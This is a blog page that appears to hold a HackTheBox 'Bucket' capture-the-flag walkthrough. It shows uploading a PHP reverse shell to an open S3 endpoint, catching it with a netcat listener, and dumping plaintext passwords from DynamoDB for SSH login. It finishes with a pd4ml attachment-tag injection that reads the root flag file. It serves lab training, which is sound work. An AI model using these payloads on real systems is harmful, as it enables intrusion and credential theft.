<!DOCTYPE html>
<!--[if lt IE 7]>      <html lang="en" class="no-js lt-ie9 lt-ie8 lt-ie7" prefix="og: http://ogp.me/ns#" itemscope itemtype="http://schema.org/Blog"> <![endif]-->
<!--[if IE 7]>         <html lang="en" class="no-js lt-ie9 lt-ie8" prefix="og: http://ogp.me/ns#" itemscope itemtype="http://schema.org/Blog"> <![endif]-->
<!--[if IE 8]>         <html lang="en" class="no-js lt-ie9" prefix="og: http://ogp.me/ns#" itemscope itemtype="http://schema.org/Blog"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en" class="no-js" prefix="og: http://ogp.me/ns#" itemscope itemtype="http://schema.org/Blog"> <!--<![endif]-->
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Random stuff - htb tag</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="">
<link rel="shortcut icon" href="/" type="">
<meta name="author" content="Pawel Mateja">
<meta name="copyright" content="Pawel Mateja">
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@" />
<meta property="og:site_name" content="Random stuff" />
<meta property="og:title" content="Random stuff" />
<meta property="og:type" content="website" />
<meta property="og:url" content="" />
<meta name="twitter:url" content="" />
<meta itemprop="name" content="Random stuff" />
<meta itemprop="url" content=""/>
<link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Random stuff ATOM Feed"/>
<link href='//fonts.googleapis.com/css?family=Open+Sans:800italic' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/uikit/2.23.0/css/uikit.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/uikit/2.23.0/css/components/search.min.css">
<link rel="stylesheet" href="/theme/css/tipuesearch.css">
<link rel="stylesheet" href="/theme/css/solarized.css">
<link rel="stylesheet" href="/theme/css/main.css">

<script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
</head>
<body>
<!--[if lt IE 7]>
            <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->

<header class=" mg-header uk-navbar uk-navbar-attached">

    <div class="uk-container uk-container-center">

        <a class="mg-brand uk-navbar-brand uk-hidden-small" href="">Random stuff</a>
        <div class="mg-tagline uk-navbar-content uk-hidden-small"></div>
        <a class="uk-navbar-toggle uk-visible-small" href="#mg-offcanvas" data-uk-offcanvas></a>
        <a class="mg-brand uk-navbar-brand uk-navbar-center uk-visible-small" href="">Random stuff</a>

    </div>
</header>

<main class="mg-main">

<div class="uk-container uk-container-center">

    <div class="uk-grid" data-uk-grid-margin>

<div class="uk-width-medium-4-5">


            <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
                <a href="/htb-bucket.html" class="uk-article-title uk-link-muted" itemprop="name">HTB: Bucket</a>
                <p class="uk-article-meta"><time datetime="2021-06-27" itemprop="datePublished">nie 27 czerwca 2021</time> • <a href="/category/hackthebox.html">HackTheBox</a></p>
</p>
                <p class="uk-article-lead" itemprop="description">Solution to the Bucket VM</p>
                <section itemprop="articleBody"><h1>Foothold</h1>
<p>First, as always we scan ports with <em>nmap</em>.</p>
<div class="highlight"><pre><span></span>nmap -sS -sV  <span class="m">10</span>.10.10.212  
Starting Nmap <span class="m">7</span>.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2021</span>-05-16 <span class="m">23</span>:27 CEST
Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.212
Host is up <span class="o">(</span><span class="m">0</span>.038s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
<span class="m">22</span>/tcp open  ssh     OpenSSH <span class="m">8</span>.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol <span class="m">2</span>.0<span class="o">)</span>
<span class="m">80</span>/tcp open  http    Apache httpd <span class="m">2</span>.4.41
Service Info: Host: <span class="m">127</span>.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">8</span>.03 seconds
</pre></div>


<p>There is something on port 80, so lets check:</p>
<div class="highlight"><pre><span></span>curl <span class="m">10</span>.10.10.212
</pre></div>


<p>Result: </p>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>302 Found<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Found<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>The document has moved <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://bucket.htb/&quot;</span><span class="p">&gt;</span>here<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">address</span><span class="p">&gt;</span>Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80<span class="p">&lt;/</span><span class="nt">address</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>


<p>So we have to map this host name with the ip address:</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s2">&quot;10.10.10.212 bucket.htb&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</pre></div>


<p>Now it start to work, but while looking through source code of recived page, we can see images urls, that are not opened correcly, like: http://s3.bucket.htb/adserver/images/bug.jpg</p>
<p>So we can add another line to our <strong>hosts</strong> file</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s2">&quot;10.10.10.212 s3.bucket.htb&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</pre></div>


<p>Great, the page is looking good right now. But the interesting part is the <strong>s3</strong> suffix, as it sounds like a local instance of the famous Amazon Simple Storage Service. And the title of this machine confirms out assumption! So... let's have some fun with it.</p>
<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/adserver/images/&quot;</span>
</pre></div>


<p>Result:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="nt">&lt;Error&gt;</span>
    <span class="nt">&lt;Code&gt;</span>NoSuchKey<span class="nt">&lt;/Code&gt;</span>
    <span class="nt">&lt;Message&gt;</span>The specified key does not exist.<span class="nt">&lt;/Message&gt;</span>

    <span class="nt">&lt;RequestID&gt;</span>7a62c49f-347e-4fc4-9331-6e8eEXAMPLE<span class="nt">&lt;/RequestID&gt;</span>
<span class="nt">&lt;/Error&gt;</span>
</pre></div>


<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/adserver/&quot;</span>
</pre></div>


<p>Result:</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
</pre></div>


<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/&quot;</span>
</pre></div>


<p>Result:</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
</pre></div>


<p>We can see different responses, so it looks promissing!</p>
<p>As it look like a s3 instance, we can try to use it like it, either by working with pure requests:</p>
<div class="highlight"><pre><span></span>curl -X PUT http://s3.bucket.htb/adserver/ -T reverse-shell.php
</pre></div>


<p>That looks like a pure luck, but it is really working... But we can try something more. Why not use some FUZZ?</p>
<div class="highlight"><pre><span></span>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc <span class="m">404</span> http://s3.bucket.htb/FUZZ/foo/
</pre></div>


<p>And hey, what we have here?!</p>
<div class="highlight"><pre><span></span>=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================


000001688:   500        0 L      13 W       158 Ch      &quot;shell&quot;                                                                                   
</pre></div>


<p>Lets take a look at this address:</p>
<p><img alt="DynamoDB web client screenshot" src="images/htb-bucket/htb-bucket.png"></p>
<p>We are definitly going somewhere. For now just note that discovery.</p>
<p>For now we can try last, but most important thing: use the <strong>aws</strong> cli. It is already on your system or just install it from system repo.</p>
<p>Now the param <strong>--endpoint-url</strong> will be crucial. Lets try:</p>
<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 ls adserver/
</pre></div>


<p>Nope, one more step is missing:</p>
<div class="highlight"><pre><span></span>aws configure
</pre></div>


<p>But we don't have any legit credentials. What can we do? Oh, well, just type anything in there. Any random stuff. And it works, jeeez!</p>
<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 ls adserver/
                           PRE images/
<span class="m">2021</span>-06-26 <span class="m">23</span>:58:04       <span class="m">5344</span> index.html
</pre></div>


<p>So prepare your pretty php reverse shell and copy it on the server, hoping it will work.</p>
<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver/
</pre></div>


<p>Now we can try to execute it:</p>
<div class="highlight"><pre><span></span>nc -lvnp <span class="m">4321</span> <span class="c1"># in one term</span>
</pre></div>


<p>Next that below in another:</p>
<div class="highlight"><pre><span></span>curl http://bucket.htb/php-reverse-shell.php
</pre></div>


<p>Then what we see on the <strong>nc</strong> awaiting for connection?</p>
<div class="highlight"><pre><span></span><span class="nt">listening</span> <span class="nt">on</span> <span class="cp">[</span><span class="nb">any</span><span class="cp">]</span> <span class="nt">4321</span> <span class="o">...</span>
<span class="nt">connect</span> <span class="nt">to</span> <span class="cp">[</span><span class="mf">10.10.14.11</span><span class="cp">]</span> <span class="nt">from</span> <span class="o">(</span><span class="nt">UNKNOWN</span><span class="o">)</span> <span class="cp">[</span><span class="mf">10.10.10.212</span><span class="cp">]</span> <span class="nt">54924</span>
<span class="nt">Linux</span> <span class="nt">bucket</span> <span class="nt">5</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">0-48-generic</span> <span class="p">#</span><span class="nn">52-Ubuntu</span> <span class="nt">SMP</span> <span class="nt">Thu</span> <span class="nt">Sep</span> <span class="nt">10</span> <span class="nt">10</span><span class="p">:</span><span class="nd">58</span><span class="p">:</span><span class="nd">49</span> <span class="nt">UTC</span> <span class="nt">2020</span> <span class="nt">x86_64</span> <span class="nt">x86_64</span> <span class="nt">x86_64</span> <span class="nt">GNU</span><span class="o">/</span><span class="nt">Linux</span>
 <span class="nt">22</span><span class="p">:</span><span class="nd">03</span><span class="p">:</span><span class="nd">15</span> <span class="nt">up</span>  <span class="nt">3</span><span class="p">:</span><span class="nd">08</span><span class="o">,</span>  <span class="nt">1</span> <span class="nt">user</span><span class="o">,</span>  <span class="nt">load</span> <span class="nt">average</span><span class="o">:</span> <span class="nt">0</span><span class="p">.</span><span class="nc">01</span><span class="o">,</span> <span class="nt">0</span><span class="p">.</span><span class="nc">20</span><span class="o">,</span> <span class="nt">0</span><span class="p">.</span><span class="nc">25</span>
<span class="nt">USER</span>     <span class="nt">TTY</span>      <span class="nt">FROM</span>             <span class="nt">LOGIN</span><span class="o">@</span>   <span class="nt">IDLE</span>   <span class="nt">JCPU</span>   <span class="nt">PCPU</span> <span class="nt">WHAT</span>
<span class="nt">roy</span>      <span class="nt">pts</span><span class="o">/</span><span class="nt">1</span>    <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">11</span>      <span class="nt">18</span><span class="p">:</span><span class="nd">59</span>   <span class="nt">56</span><span class="p">.</span><span class="nc">00s</span>  <span class="nt">0</span><span class="p">.</span><span class="nc">44s</span>  <span class="nt">0</span><span class="p">.</span><span class="nc">44s</span> <span class="nt">-bash</span>
<span class="nt">uid</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span> <span class="nt">gid</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span> <span class="nt">groups</span><span class="o">=</span><span class="nt">33</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span>
<span class="o">/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sh</span><span class="o">:</span> <span class="nt">0</span><span class="o">:</span> <span class="nt">can</span><span class="err">&#39;</span><span class="nt">t</span> <span class="nt">access</span> <span class="nt">tty</span><span class="o">;</span> <span class="nt">job</span> <span class="nt">control</span> <span class="nt">turned</span> <span class="nt">off</span>
<span class="o">$</span> 
</pre></div>


<p>BOOM, we are inside!</p>
<h1>User</h1>
<p>Escalating privileges in this case is quite simple, but we have to combine something new to find, with some foothold info. And with some luck, if it was a real life scenario.</p>
<p>Of course it is recomended to start some enumaration scripts in this moment. Like <em>LinEnum</em> or <em>linpeas</em> and I encourage you to do it. But lets jump straight to the solution.</p>
<div class="highlight"><pre><span></span>$ <span class="nb">cd</span> /home
$ ls
roy
$ <span class="nb">cd</span> roy
$ ls
project
user.txt
$ cat user.txt
cat: user.txt: Permission denied
</pre></div>


<p>That give us at least the user name: <em>roy</em>. Great, but what about the password. Lets step back, to the foothold. We know about the dynamodb service, and we probably have access to id. Why not try to dive in it?</p>
<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb list-tables
</pre></div>


<p>Result:</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="nt">&quot;TableNames&quot;</span><span class="p">:</span> <span class="p">[</span>
        <span class="s2">&quot;users&quot;</span>
    <span class="p">]</span>
<span class="p">}</span>
</pre></div>


<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb scan --table-name users
</pre></div>


<p>Result:</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="nt">&quot;Items&quot;</span><span class="p">:</span> <span class="p">[</span>
        <span class="p">{</span>
            <span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span>
                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Management@#1@#&quot;</span>
            <span class="p">},</span>
            <span class="nt">&quot;username&quot;</span><span class="p">:</span> <span class="p">{</span>
                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Mgmt&quot;</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="p">{</span>
            <span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span>
                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Welcome123!&quot;</span>
            <span class="p">},</span>
            <span class="nt">&quot;username&quot;</span><span class="p">:</span> <span class="p">{</span>
                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Cloudadm&quot;</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="p">{</span>
            <span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span>
                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;n2vM-&lt;_K_Q:.Aa2&quot;</span>
            <span class="p">},</span>
            <span class="nt">&quot;username&quot;</span><span class="p">:</span> <span class="p">{</span>
                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Sysadm&quot;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">],</span>
    <span class="nt">&quot;Count&quot;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
    <span class="nt">&quot;ScannedCount&quot;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
    <span class="nt">&quot;ConsumedCapacity&quot;</span><span class="p">:</span> <span class="kc">null</span>
<span class="p">}</span>
</pre></div>


<p>We have found three passwords to try. And guess what: we can use the third one to log in through <em>ssh</em> to <em>roy's</em> account!</p>
<div class="highlight"><pre><span></span>ssh roy@10.10.10.212
Welcome to Ubuntu <span class="m">20</span>.04 LTS <span class="o">(</span>GNU/Linux <span class="m">5</span>.4.0-48-generic x86_64<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun <span class="m">27</span> Jun <span class="m">2021</span> <span class="m">09</span>:44:22 AM UTC

  System load:                      <span class="m">0</span>.0
  Usage of /:                       <span class="m">33</span>.8% of <span class="m">17</span>.59GB
  Memory usage:                     <span class="m">22</span>%
  Swap usage:                       <span class="m">0</span>%
  Processes:                        <span class="m">239</span>
  Users logged in:                  <span class="m">0</span>
  IPv4 address <span class="k">for</span> br-bee97070fb20: <span class="m">172</span>.18.0.1
  IPv4 address <span class="k">for</span> docker0:         <span class="m">172</span>.17.0.1
  IPv4 address <span class="k">for</span> ens160:          <span class="m">10</span>.10.10.212
  IPv6 address <span class="k">for</span> ens160:          dead:beef::250:56ff:feb9:c8be


<span class="m">229</span> updates can be installed immediately.
<span class="m">103</span> of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check <span class="k">for</span> new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jun <span class="m">26</span> <span class="m">18</span>:59:31 <span class="m">2021</span> from <span class="m">10</span>.10.14.11
roy@bucket:~$ ls
project  user.txt
roy@bucket:~$ cat user.txt 
1845bbd4c30469474a3f5d2be1a32922
</pre></div>


<p>As we have the user flag, lets jump into the final part.</p>
<h1>Root</h1>
<div class="highlight"><pre><span></span>roy@bucket:~$ <span class="nb">cd</span> /var/www/
roy@bucket:/var/www$ ls -l
total <span class="m">8</span>
drwxr-x---+ <span class="m">4</span> root root <span class="m">4096</span> Feb <span class="m">10</span> <span class="m">12</span>:29 bucket-app
drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Jun <span class="m">27</span> <span class="m">09</span>:46 html
roy@bucket:/var/www$ <span class="nb">cd</span> bucket-app/
roy@bucket:/var/www/bucket-app$ ls
composer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor
roy@bucket:/var/www/bucket-app$ head -n <span class="m">30</span> index.php 
&lt;?php
require <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>
use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<span class="p">;</span>
<span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="o">]===</span><span class="s2">&quot;POST&quot;</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span><span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;action&quot;</span><span class="o">]===</span><span class="s2">&quot;get_alerts&quot;</span><span class="o">)</span> <span class="o">{</span>
                date_default_timezone_set<span class="o">(</span><span class="s1">&#39;America/New_York&#39;</span><span class="o">)</span><span class="p">;</span>
                <span class="nv">$client</span> <span class="o">=</span> new DynamoDbClient<span class="o">([</span>
                        <span class="s1">&#39;profile&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;default&#39;</span>,
                        <span class="s1">&#39;region&#39;</span>  <span class="o">=</span>&gt; <span class="s1">&#39;us-east-1&#39;</span>,
                        <span class="s1">&#39;version&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;latest&#39;</span>,
                        <span class="s1">&#39;endpoint&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;http://localhost:4566&#39;</span>
                <span class="o">])</span><span class="p">;</span>

                <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span>-&gt;getIterator<span class="o">(</span><span class="s1">&#39;Scan&#39;</span>, array<span class="o">(</span>
                        <span class="s1">&#39;TableName&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;alerts&#39;</span>,
                        <span class="s1">&#39;FilterExpression&#39;</span> <span class="o">=</span>&gt; <span class="s2">&quot;title = :title&quot;</span>,
                        <span class="s1">&#39;ExpressionAttributeValues&#39;</span> <span class="o">=</span>&gt; array<span class="o">(</span><span class="s2">&quot;:title&quot;</span><span class="o">=</span>&gt;array<span class="o">(</span><span class="s2">&quot;S&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;Ransomware&quot;</span><span class="o">))</span>,
                <span class="o">))</span><span class="p">;</span>

                foreach <span class="o">(</span><span class="nv">$iterator</span> as <span class="nv">$item</span><span class="o">)</span> <span class="o">{</span>
                        <span class="nv">$name</span><span class="o">=</span>rand<span class="o">(</span><span class="m">1</span>,10000<span class="o">)</span>.<span class="s1">&#39;.html&#39;</span><span class="p">;</span>
                        file_put_contents<span class="o">(</span><span class="s1">&#39;files/&#39;</span>.<span class="nv">$name</span>,<span class="nv">$item</span><span class="o">[</span><span class="s2">&quot;data&quot;</span><span class="o">])</span><span class="p">;</span>
                <span class="o">}</span>
                passthru<span class="o">(</span><span class="s2">&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf&quot;</span><span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
<span class="o">}</span>
<span class="k">else</span>
<span class="o">{</span>
?&gt;
</pre></div>


<p>Looks promissing, but will it be enough? To escalate to root we need to take controll over a process running with root privileges. We will take a look at the apache config:</p>
<div class="highlight"><pre><span></span>roy@bucket:/var/www/bucket-app$ head /etc/apache2/sites-available/000-default.conf 
&lt;VirtualHost <span class="m">127</span>.0.0.1:8000&gt;
        &lt;IfModule mpm_itk_module&gt;
                AssignUserId root root
        &lt;/IfModule&gt;
        DocumentRoot /var/www/bucket-app
&lt;/VirtualHost&gt;
</pre></div>


<p>God bless the man who did it. And forbid him.</p>
<p>Now we need to read carefully what we have above in the <strong>index.php</strong> file.</p>
<p>There is a script, that is executed by a certain request from the vulnerable machine:</p>
<div class="highlight"><pre><span></span>curl -X POST -F <span class="s1">&#39;action=get_alerts&#39;</span> http://127.0.0.1:8000 <span class="p">;</span> rm /tmp/hack/* <span class="p">;</span> cp * /tmp/unc
</pre></div>


<p>But to do anything we have to insert something to <em>alerts</em> table in dynamodb with the title of <em>Ransomware</em>. We have seen before, that there is no such table as <em>alerts</em>, so we have first to create it:</p>
<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span><span class="m">5</span>,WriteCapacityUnits<span class="o">=</span><span class="m">5</span>
</pre></div>


<p>then we will be able to inject out exploit:</p>
<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;EXPLOIT PLACEHOLDER&quot;} } &#39;</span>
</pre></div>


<p>But wait, do we have one? Sure, take a look at the line: </p>
<div class="highlight"><pre><span></span><span class="x">passthru(&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.</span>
</pre></div>


<p>it is our key to the kingdom. Google <em>pd4ml vulnerabilities</em> to find this awesome article: https://infosecwriteups.com/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd about <em>pd4ml:attachment</em> tag, that we can use here. </p>
<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&lt;html&gt; &lt;pd4ml:attachment src=file:///root/root.txt description=test&gt;&lt;/pd4ml:attachment&gt;&lt;/html&gt;&quot;} } &#39;</span>
</pre></div>


<p>Finding a perfect syntax to send to the db is a bit of a pain. The <em>description</em> attribute seems to be mandatory, but -- thanks God -- brackets around the arguments values aren't, which makes it a bit easier to read, cause we don't need to escape it.</p>
<p>There is one more problem. There is a cront task, that is clearing the database and the <em>/var/www/bucket-app/files</em> directory every few minutes. So we have to be fast. Or smart. Fast and smart.</p>
<p>We have to execute this oneliner on our machine:</p>
<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span><span class="m">5</span>,WriteCapacityUnits<span class="o">=</span><span class="m">5</span><span class="p">;</span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&lt;html&gt; &lt;pd4ml:attachment src=file:///root/root.txt description=test&gt;&lt;/pd4ml:attachment&gt;&lt;/html&gt;&quot;} } &#39;</span>
</pre></div>


<p>and after that this one on the vulnerable one:</p>
<div class="highlight"><pre><span></span>curl -X POST -F <span class="s1">&#39;action=get_alerts&#39;</span> http://127.0.0.1:8000 <span class="p">;</span> rm -r /tmp/hack <span class="p">;</span> mkdir -p /tmp/hack <span class="p">;</span> cp /var/www/bucket-app/files/* /tmp/hack <span class="p">;</span> cat /tmp/hack/result.pdf
</pre></div>


<p>Thats the speed of light, babe! Inside the pdf content we can see this part:</p>
<div class="highlight"><pre><span></span>/Type /EmbeddedFile
/Length 33
/Params 5 0 R
&gt;&gt;
stream
3ba97200d588ae0d517c117a03396f10
endstream
endobj
7 0 obj
&lt;&lt;
/Type /Filespec
/F (root.txt)
</pre></div>


<p>Yay! See the root flag in the middle?</p></section>
                <a href="/htb-bucket.html#disqus_thread"></a>
                <hr class="uk-article-divider">
            </article>


        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
                <a href="/bashed.html" class="uk-article-title uk-link-muted" itemprop="name">Bashed</a>
                <p class="uk-article-meta"><time datetime="2020-01-13" itemprop="datePublished">pon 13 stycznia 2020</time> • <a href="/category/hackthebox.html">HackTheBox</a></p>
</p>
                <p class="uk-article-lead" itemprop="description">Solution to the Bashed VM</p>
                <p>User flag It is not really necessary to start this one with nmap, but it's never a bad first step root@kali:~# nmap -sS -Pn -sV 10.10.10.68 Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET Nmap scan report for 10.10.10.68 Host is up (0.11s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1...</p>
                <a href="/bashed.html">Read More</a>
                <hr class="uk-article-divider">
        </article>


</div>

        <div class="uk-width-medium-1-5 uk-hidden-small">

            <div class="uk-panel uk-panel-box">
                <form class="uk-search" action="search.html" data-uk-search>
                    <input class="uk-search-field tipue_search" type="search" name="q" id="tipue_search_input" autocomplete="off" placeholder="Search...">
                </form>
            </div>

            <div class="uk-panel uk-panel-box">
                <ul class="uk-nav uk-nav-side">
                    <li class="uk-nav-header">Categories</li>
                    <li ><a href="/category/food-pl.html">Food [PL]</a></li>
                    <li ><a href="/category/hackthebox.html">HackTheBox</a></li>
                    <li ><a href="/category/python.html">Python</a></li>
                    <li ><a href="/category/snippets.html">Snippets</a></li>
                    <li class="uk-nav-header">Pages</li>



                    <li class="uk-nav-divider"></li>
                    <li ><a href="/archives.html">Archives</a></li>
                </ul>
            </div>

            <div class="uk-panel uk-panel-box">
                <h3 class="uk-panel-title">Receive Updates</h3>
                <a rel="alternate" type="application/atom+xml" href="/feeds/all.atom.xml" class="mg-feed"><i class="uk-icon-rss uk-icon-medium"></i> ATOM</a>
            </div>

            <div class="uk-panel uk-panel-box">
                <h3 class="uk-panel-title">Contacts</h3>
                <a class="mg-icon-link" href="https://github.com/pmateja">
                    <i class="uk-icon-Github uk-icon-medium"></i>
                </a>
